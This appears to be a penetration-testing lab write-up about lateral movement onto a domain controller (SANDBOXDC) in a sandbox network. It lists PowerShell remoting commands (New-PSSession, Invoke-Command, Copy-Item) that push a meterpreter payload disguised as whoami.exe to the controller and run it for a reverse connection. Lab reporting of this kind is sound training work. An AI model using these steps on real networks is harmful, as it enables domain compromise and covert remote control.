# Sandboxdc (10.5.5.30)
***
> [!info] 
> By exploiting the vulnerabilities on **Cevapi**, we are able to impersonate a `sandbox.local` administrator and was able to run commands as that user.
> ![[sandboxdc-whoami.png]] 

## Enumeration
1. Using our access from **Cevapi**, we extracted the hostname of the domain controller - `SANDBOXDC`.
![[sandboxdc-nslookup.png]]
***
## Exploitation
1. With the hostname acquired, we launched powershell and used `New-PSSession` with the flag `-Computer SANDBOXDC` to start a new session on the domain controller, which will be saved in the `$dcsesh` object.
```
$dcsesh = New-PSSession -Computer SANDBOXDC
```
![[sandboxdc-session.png]]

2. We used the `Invoke-Command` cmdlet to run a command against the domain controller. We need to pass in the session with the `-Session` flag and the command we want to execute with the `-ScriptBlock` command.
```
Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
```
![[sandboxdc-command.png]]

***
## Post-exploitation
> [!todo] 
> Now that we know we can execute commands against the **Domain Controller**, we will transfer and execute a meterpreter shell. 
> 
> We used the same payload (`whoami.exe`) when exploiting **Poultry** and **Cevapi**

1. We used the PowerShell command `Copy-Item` to transfer our payload from **Cevapi** to **Domain Controller (sandboxdc)**. 
```
Copy-Item "C:\Users\Public\exploit\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
```
> [!info] 
>  `C:\Users\Public\exploit\whoami.exe` - source (from **Cevapi**)
>  `C:\Users\Public\` - destination (to **sandboxdc**)
>  `$dcsesh` - the sandbox\\Administrator session we created earlier

2. With a meterpreter listener running on the background (`exploit -j`), we run our payload and got a meterpreter connection.
   
```
PS C:\Windows\system32> $dcsesh = New-PSSession -Computer SANDBOXDC
PS C:\Windows\system32> Invoke-Command -Session $dcsesh -ScriptBlock {C:\Users\Public\whoami.exe}
```

![[sandboxdc-meterpreter.png]]